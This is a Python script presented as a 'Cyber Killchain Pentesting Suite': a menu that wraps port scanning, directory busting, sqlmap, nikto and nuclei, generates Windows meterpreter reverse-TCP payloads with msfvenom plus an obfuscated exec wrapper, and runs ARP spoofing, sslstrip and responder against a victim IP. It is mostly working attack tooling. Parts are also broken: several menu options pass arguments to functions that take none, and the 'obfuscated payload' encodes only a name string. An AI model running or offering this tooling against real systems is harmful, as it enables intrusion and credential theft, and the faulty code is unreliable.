import os
import subprocess
import sys
import nmap
import base64
import zlib

def scan(ip):
    nm = nmap.PortScanner()
    print("Scanning...")
    nm.scan(ip, '1-65535')
    print(nm.all_hosts())
    for host in nm.all_hosts():
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            for port in lport:
                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))

def dirbust():
    url = input("Enter the URL to scan: ")
    print("Directory busting...")
    subprocess.call(['dirb', url])

def sqlmap():
    url = input("Enter the URL to scan: ")
    print("SQL injection testing...")
    subprocess.call(['sqlmap', '-u', url])

def nikto():
    url = input("Enter the URL to scan: ")
    print("Web server scanning...")
    subprocess.call(['nikto', '-h', url])

def nuclei():
    url = input("Enter the URL to scan: ")
    print("Web server scanning...")
    subprocess.call(['nuclei', '-u', url])

def msfvenom():
    print("Creating payload...")
    ip = input("Enter your IP address: ")
    port = input("Enter a port: ")
    payload_name = input("Enter the name of the payload: ")
    payload = 'windows/meterpreter/reverse_tcp'
    format = 'exe'
    encoded_payload = base64.b64encode(payload.encode('utf-8'))
    compressed_payload = zlib.compress(encoded_payload)
    encoded_compressed_payload = base64.b64encode(compressed_payload)
    payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} > {payload_name}.{format}")
    with open(f'{payload_name}.py', 'w') as f:
        f.write(payload_code)
    print("Payload created: {}.{}".format(payload_name, format))


def arp():
    print("ARP spoofing...")
    victim_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])


def mitm():
    print("MITM attack...")
    victim_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    interface = input("Enter Interface of connection: ")
    subprocess.call(['sslstrip'])
    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
    subprocess.call(f"responder -I  {interface} -P -F -d -b ")


def menu():
    while True:
        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
        print("1. Port Scanning")
        print("2. Directory Busting")
        print("3. SQLInjection Testing")
        print("4. Web Server Scanning with Nikto")
        print("5. Web Server Scanning with Nuclei")
        print("6. Generate Metasploit Payload")
        print("7. ARP Spoofing")
        print("8. Man-in-the-Middle Attack")
        print("9. Exit\n")
        choice = input("Enter your choice: ")
        if choice == '1':
            ip = input("Enter IP address to scan: ")
            scan(ip)
        elif choice == '2':
            url = input("Enter URL: ")
            dirbust(url)
        elif choice == '3':
            url = input("Enter URL: ")
            sqlmap(url)
        elif choice == '4':
            url = input("Enter URL: ")
            nikto(url)
        elif choice == '5':
            url = input("Enter URL: ")
            nuclei(url)
        elif choice == '6':
            msfvenom()
        elif choice == '7':
            arp()
        elif choice == '8':
            mitm()
        elif choice == '9':
            print("Exiting...")
            sys.exit()
        else:
            print("Invalid choice, please try again.")


if __name__ == '__main__':
    menu()
